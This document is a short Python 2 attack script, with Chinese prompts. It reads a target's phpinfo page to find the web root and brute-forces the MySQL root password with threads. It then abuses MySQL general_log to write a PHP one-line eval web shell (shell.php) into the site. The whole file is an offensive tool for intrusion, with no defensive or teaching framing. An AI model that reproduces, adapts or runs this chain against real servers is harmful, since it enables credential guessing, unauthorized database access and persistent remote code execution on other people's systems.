#!/usr/bin/env python
#-*-coding:utf-8-*-
from threading import *
import urllib
import re
import MySQLdb
def brutesql(username,tar,database,passwd,ur):
	ur=ur+'/shell.php'
	try:
		conn=MySQLdb.connect(host=tar,user='root',passwd=passwd,db='mysql',port=3306,connect_timeout=0)
		cursor = conn.cursor()
		print '[!]目标：'+tar+' 用户名:'+user+'  密码：'+passwd+'  数据库：'+database +' 连接成功 '
	except:
		print "[*]爆破失败"
	try:
		print '[*]开始写入'
		sql1="SET GLOBAL general_log='ON';"
		a=cursor.execute(sql1)
		print '[!]SET GLOBAL general_log=\'ON\';写入并返回:>'+a
		sql2="SET GLOBAL general_log_file=\'"+ur+"\';"
		a=cursor.execute(sql2)
		print sql2+"[!]<：已经写入并得知"+a
		sql3="select '<?php@eval($_POST['x']);?>';"
		a=cursor.execute(sql3)
		print sql3+"[!]成功一句话写入完毕：>"+a
	except:
		print '[!]写入失败'


	


if __name__ == '__main__':
	ur=''
	try:
		x=raw_input("target:>")
		x=("http://"+x+"/phpinfo.php")
		page = urllib.urlopen(x)
		html = page.read()
		s=re.compile(r'''_SERVER\[\"DOCUMENT_ROOT\"\].*''')
		s=re.findall(s,html)
		print "[+]Get Path:      ",	s
		x=re.compile(r"\"v\">(.*?)<\/")
		s=re.findall(x,str(s[0]))
		print "[+]Regularly Path:",str(s[0])
		
		ur=str(s[0])
	except:
		print "[-]fail info"

	
	dic=raw_input("[*]密码字典:>")
	fil=open(dic,'r+')
	fil=fil.readlines()
	tar=raw_input("[*]目标数据库服务器:>")
	print "[Set Address]: "+tar
	print "[*]多线程启动中"
	user = 'root'
	data = 'mysql'
	for word in fil:
		word=word.strip('\n')
		a=Thread(target=brutesql,args=(user,tar,data,word,ur))
		a.start()
		
